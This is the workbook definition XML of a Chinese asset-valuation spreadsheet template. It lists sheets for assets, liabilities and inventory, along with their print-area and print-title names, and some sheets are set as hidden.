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comments/comment1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.comments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900" windowHeight="12620" tabRatio="840" firstSheet="4" activeTab="7" autoFilterDateGrouping="1"/>
  </bookViews>
  <sheets>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="目录" sheetId="1" state="hidden" r:id="rId1"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="0-报告用表" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="公式数据表" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="设置" sheetId="4" state="visible" r:id="rId4"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="0-其他方法结论" sheetId="5" state="visible" r:id="rId5"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="设定信息" sheetId="6" state="visible" r:id="rId6"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="1-汇总表" sheetId="7" state="visible" r:id="rId7"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="2-分类汇总" sheetId="8" state="visible" r:id="rId8"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-流动资产汇总" sheetId="9" state="visible" r:id="rId9"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-1货币资金汇总表" sheetId="10" state="visible" r:id="rId10"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-1-1现金" sheetId="11" state="visible" r:id="rId11"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-1-2银行存款" sheetId="12" state="visible" r:id="rId12"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-1-3其他货币资金" sheetId="13" state="visible" r:id="rId13"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-2交易性金融资产汇总" sheetId="14" state="visible" r:id="rId14"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-2-1-股票" sheetId="15" state="visible" r:id="rId15"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-2-2-债券" sheetId="16" state="visible" r:id="rId16"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-2-3-基金" sheetId="17" state="visible" r:id="rId17"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-3衍生金融资产" sheetId="18" state="visible" r:id="rId18"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-4应收票据" sheetId="19" state="visible" r:id="rId19"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-5应收账款" sheetId="20" state="visible" r:id="rId20"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-6应收款项融资" sheetId="21" state="visible" r:id="rId21"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-7预付款项" sheetId="22" state="visible" r:id="rId22"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-8其他应收款汇总" sheetId="23" state="visible" r:id="rId23"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-8-1应收利息" sheetId="24" state="visible" r:id="rId24"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-8-2应收股利" sheetId="25" state="visible" r:id="rId25"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-8-3其他应收款" sheetId="26" state="visible" r:id="rId26"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-辅-流动资产汇总" sheetId="27" state="hidden" r:id="rId27"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-辅-存货汇总" sheetId="28" state="hidden" r:id="rId28"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9存货汇总" sheetId="29" state="visible" r:id="rId29"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-1在途物资" sheetId="30" state="visible" r:id="rId30"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-2原材料" sheetId="31" state="visible" r:id="rId31"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-3在库周转材料" sheetId="32" state="visible" r:id="rId32"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-4委托加工物资" sheetId="33" state="visible" r:id="rId33"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-5产成品（库存商品）" sheetId="34" state="visible" r:id="rId34"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-6在产品（自制半成品）" sheetId="35" state="visible" r:id="rId35"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-7发出商品" sheetId="36" state="visible" r:id="rId36"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-8在用周转材料" sheetId="37" state="visible" r:id="rId37"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-9-9合同履约成本" sheetId="38" state="visible" r:id="rId38"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-10合同资产" sheetId="39" state="visible" r:id="rId39"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-11持有待售资产" sheetId="40" state="visible" r:id="rId40"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-12一年到期非流动资产" sheetId="41" state="visible" r:id="rId41"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="3-13其他流动资产" sheetId="42" state="visible" r:id="rId42"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-非流动资产汇总" sheetId="43" state="visible" r:id="rId43"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-1债权投资" sheetId="44" state="visible" r:id="rId44"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-2其他债权投资" sheetId="45" state="visible" r:id="rId45"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-3长期应收" sheetId="46" state="visible" r:id="rId46"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-4股权投资" sheetId="47" state="visible" r:id="rId47"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-5其他权益工具投资" sheetId="48" state="visible" r:id="rId48"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-6其他非流动金融资产汇总" sheetId="49" state="visible" r:id="rId49"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-6-1-股票" sheetId="50" state="visible" r:id="rId50"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-6-2-债券" sheetId="51" state="visible" r:id="rId51"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-6-3-基金" sheetId="52" state="visible" r:id="rId52"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-7投资性房地产汇总" sheetId="53" state="visible" r:id="rId53"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-7-1投资性房地产" sheetId="54" state="visible" r:id="rId54"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-7-2投资性房地产" sheetId="55" state="visible" r:id="rId55"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-7-3投资性地产" sheetId="56" state="visible" r:id="rId56"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-7-4投资性地产" sheetId="57" state="visible" r:id="rId57"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8固定资产汇总" sheetId="58" state="visible" r:id="rId58"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8-1房屋建筑物" sheetId="59" state="visible" r:id="rId59"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8-2构筑物" sheetId="60" state="visible" r:id="rId60"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8-3管道沟槽" sheetId="61" state="visible" r:id="rId61"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8-4机器设备" sheetId="62" state="visible" r:id="rId62"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8-5车辆" sheetId="63" state="visible" r:id="rId63"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8-6电子设备" sheetId="64" state="visible" r:id="rId64"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-8-7固定资产清理" sheetId="65" state="visible" r:id="rId65"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-9在建工程汇总" sheetId="66" state="visible" r:id="rId66"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-9-1在建（土建）" sheetId="67" state="visible" r:id="rId67"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-9-2在建（设备）" sheetId="68" state="visible" r:id="rId68"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-9-3在建工程（工程物资）" sheetId="69" state="visible" r:id="rId69"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-10生产性生物资产" sheetId="70" state="visible" r:id="rId70"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-11油气资产" sheetId="71" state="visible" r:id="rId71"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-12使用权资产" sheetId="72" state="visible" r:id="rId72"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-13无形资产汇总" sheetId="73" state="visible" r:id="rId73"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-13-1无形-土地" sheetId="74" state="visible" r:id="rId74"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-13-2无形-矿业权" sheetId="75" state="visible" r:id="rId75"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-13-3无形-其他" sheetId="76" state="visible" r:id="rId76"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-14开发支出" sheetId="77" state="visible" r:id="rId77"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-15商誉" sheetId="78" state="visible" r:id="rId78"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-16长期待摊费用" sheetId="79" state="visible" r:id="rId79"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-17递延所得税资产" sheetId="80" state="visible" r:id="rId80"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="4-18其他非流动资产" sheetId="81" state="visible" r:id="rId81"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-流动负债汇总" sheetId="82" state="visible" r:id="rId82"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-1短期借款" sheetId="83" state="visible" r:id="rId83"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-2交易性金融负债" sheetId="84" state="visible" r:id="rId84"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-3衍生金融负债" sheetId="85" state="visible" r:id="rId85"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-4应付票据" sheetId="86" state="visible" r:id="rId86"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-5应付账款" sheetId="87" state="visible" r:id="rId87"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-6预收款项" sheetId="88" state="visible" r:id="rId88"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-7合同负债" sheetId="89" state="visible" r:id="rId89"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-8应付职工薪酬" sheetId="90" state="visible" r:id="rId90"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-9应交税费" sheetId="91" state="visible" r:id="rId91"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-10其他应付款汇总表" sheetId="92" state="visible" r:id="rId92"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-10-1应付利息" sheetId="93" state="visible" r:id="rId93"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-10-2应付股利（利润）" sheetId="94" state="visible" r:id="rId94"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-10-3其他应付款" sheetId="95" state="visible" r:id="rId95"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-11持有待售负债" sheetId="96" state="visible" r:id="rId96"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-12一年到期非流动负债" sheetId="97" state="visible" r:id="rId97"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="5-13其他流动负债" sheetId="98" state="visible" r:id="rId98"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-非流动负债汇总" sheetId="99" state="visible" r:id="rId99"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-1长期借款" sheetId="100" state="visible" r:id="rId100"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-2应付债券" sheetId="101" state="visible" r:id="rId101"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-3租赁负债" sheetId="102" state="visible" r:id="rId102"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-4长期应付款" sheetId="103" state="visible" r:id="rId103"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-5长期应付职工薪酬" sheetId="104" state="visible" r:id="rId104"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-6预计负债" sheetId="105" state="visible" r:id="rId105"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-7递延收益" sheetId="106" state="visible" r:id="rId106"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-8递延所得税负债" sheetId="107" state="visible" r:id="rId107"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="6-9其他非流动负债" sheetId="108" state="visible" r:id="rId108"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="8-减值准备汇总表" sheetId="109" state="hidden" r:id="rId109"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="9-非财务信息汇总表" sheetId="110" state="hidden" r:id="rId110"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="净资产汇总" sheetId="111" state="hidden" r:id="rId111"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="00000000" sheetId="112" state="veryHidden" r:id="rId112"/>
  </sheets>
  <definedNames>
    <definedName name="_Fill" hidden="1">#REF!</definedName>
    <definedName name="lo" hidden="1">#REF!</definedName>
    <definedName name="wrn.负债及权益." hidden="1">{"负债及权益",#N/A,FALSE,"TB-BS"}</definedName>
    <definedName name="wrn.现金." hidden="1">{"现金主表",#N/A,FALSE,"正式Cashflow"}</definedName>
    <definedName name="wrn.现金主表." hidden="1">{"现金主表",#N/A,FALSE,"正式Cashflow"}</definedName>
    <definedName name="wrn.资产." hidden="1">{"资产",#N/A,FALSE,"TB-BS"}</definedName>
    <definedName name="被评估单位">设定信息!$B$6</definedName>
    <definedName name="评估基准日">设定信息!$B$7</definedName>
    <definedName name="_xlnm._FilterDatabase" localSheetId="3" hidden="1">'设置'!$A$8:$D$108</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="4">'0-其他方法结论'!$C$1:$J$23</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="5">'设定信息'!$A$1:$F$29</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="6">'1-汇总表'!$B$1:$H$33</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="7">'2-分类汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="7">'2-分类汇总'!$B$1:$H$66</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="8">'3-流动资产汇总'!$B$1:$H$27</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="9">'3-1货币资金汇总表'!$B$1:$I$24</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="10">'3-1-1现金'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="10">'3-1-1现金'!$B$1:$K$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="11">'3-1-2银行存款'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="11">'3-1-2银行存款'!$B$1:$L$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="12">'3-1-3其他货币资金'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="12">'3-1-3其他货币资金'!$B$1:$L$31</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="13">'3-2交易性金融资产汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="13">'3-2交易性金融资产汇总'!$B$1:$H$25</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="14">'3-2-1-股票'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="14">'3-2-1-股票'!$B$1:$M$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="15">'3-2-2-债券'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="15">'3-2-2-债券'!$B$1:$M$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="16">'3-2-3-基金'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="16">'3-2-3-基金'!$B$1:$M$31</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="17">'3-3衍生金融资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="17">'3-3衍生金融资产'!$B$1:$J$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="18">'3-4应收票据'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="18">'3-4应收票据'!$B$1:$K$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="19">'3-5应收账款'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="19">'3-5应收账款'!$B$1:$N$29</definedName>
    <definedName name="_Fill" localSheetId="20" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="20" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="20">'3-6应收款项融资'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="20">'3-6应收款项融资'!$B$1:$N$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="21">'3-7预付款项'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="21">'3-7预付款项'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="22">'3-8其他应收款汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="22">'3-8其他应收款汇总'!$B$1:$H$26</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="23">'3-8-1应收利息'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="23">'3-8-1应收利息'!$B$1:$L$30</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="24">'3-8-2应收股利'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="24">'3-8-2应收股利'!$B$1:$J$30</definedName>
    <definedName name="_Fill" localSheetId="25" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="25" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="25">'3-8-3其他应收款'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="25">'3-8-3其他应收款'!$B$1:$N$30</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="27">'3-9-辅-存货汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="27">'3-9-辅-存货汇总'!$A$1:$I$24</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="28">'3-9存货汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="28">'3-9存货汇总'!$B$1:$H$24</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="29">'3-9-1在途物资'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="29">'3-9-1在途物资'!$B$1:$M$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="30">'3-9-2原材料'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="30">'3-9-2原材料'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="31">'3-9-3在库周转材料'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="31">'3-9-3在库周转材料'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="32">'3-9-4委托加工物资'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="32">'3-9-4委托加工物资'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="33">'3-9-5产成品（库存商品）'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="33">'3-9-5产成品（库存商品）'!$B$1:$O$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="34">'3-9-6在产品（自制半成品）'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="34">'3-9-6在产品（自制半成品）'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="35">'3-9-7发出商品'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="35">'3-9-7发出商品'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="36">'3-9-8在用周转材料'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="36">'3-9-8在用周转材料'!$B$1:$O$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="37">'3-9-9合同履约成本'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="37">'3-9-9合同履约成本'!$B$1:$I$28</definedName>
    <definedName name="_Fill" localSheetId="38" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="38" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="38">'3-10合同资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="38">'3-10合同资产'!$B$1:$J$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="39">'3-11持有待售资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="39">'3-11持有待售资产'!$B$1:$M$30</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="40">'3-12一年到期非流动资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="40">'3-12一年到期非流动资产'!$B$1:$J$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="41">'3-13其他流动资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="41">'3-13其他流动资产'!$B$1:$K$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="42">'4-非流动资产汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="42">'4-非流动资产汇总'!$B$1:$H$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="43">'4-1债权投资'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="43">'4-1债权投资'!$B$1:$M$28</definedName>
    <definedName name="_Fill" localSheetId="44" hidden="1">#REF!</definedName>
    <definedName name="wrn.负债及权益." localSheetId="44" hidden="1">{"负债及权益",#N/A,FALSE,"TB-BS"}</definedName>
    <definedName name="wrn.现金." localSheetId="44" hidden="1">{"现金主表",#N/A,FALSE,"正式Cashflow"}</definedName>
    <definedName name="wrn.现金主表." localSheetId="44" hidden="1">{"现金主表",#N/A,FALSE,"正式Cashflow"}</definedName>
    <definedName name="wrn.资产." localSheetId="44" hidden="1">{"资产",#N/A,FALSE,"TB-BS"}</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="44">'4-2其他债权投资'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="44">'4-2其他债权投资'!$B$1:$M$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="45">'4-3长期应收'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="45">'4-3长期应收'!$B$1:$J$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="46">'4-4股权投资'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="46">'4-4股权投资'!$B$1:$L$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="47">'4-5其他权益工具投资'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="47">'4-5其他权益工具投资'!$B$1:$K$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="48">'4-6其他非流动金融资产汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="48">'4-6其他非流动金融资产汇总'!$B$1:$H$25</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="49">'4-6-1-股票'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="49">'4-6-1-股票'!$B$1:$M$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="50">'4-6-2-债券'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="50">'4-6-2-债券'!$B$1:$M$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="51">'4-6-3-基金'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="51">'4-6-3-基金'!$B$1:$M$31</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="52">'4-7投资性房地产汇总'!$B$1:$H$21</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="53">'4-7-1投资性房地产'!$1:$7</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="53">'4-7-1投资性房地产'!$B$1:$R$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="54">'4-7-2投资性房地产'!$1:$7</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="54">'4-7-2投资性房地产'!$B$1:$P$26</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="55">'4-7-3投资性地产'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="55">'4-7-3投资性地产'!$B$1:$R$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="56">'4-7-4投资性地产'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="56">'4-7-4投资性地产'!$B$1:$R$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="57">'4-8固定资产汇总'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="57">'4-8固定资产汇总'!$B$1:$L$21</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="58">'4-8-1房屋建筑物'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="58">'4-8-1房屋建筑物'!$B$1:$S$34</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="59">'4-8-2构筑物'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="59">'4-8-2构筑物'!$B$1:$S$34</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="60">'4-8-3管道沟槽'!$1:$6</definedName>
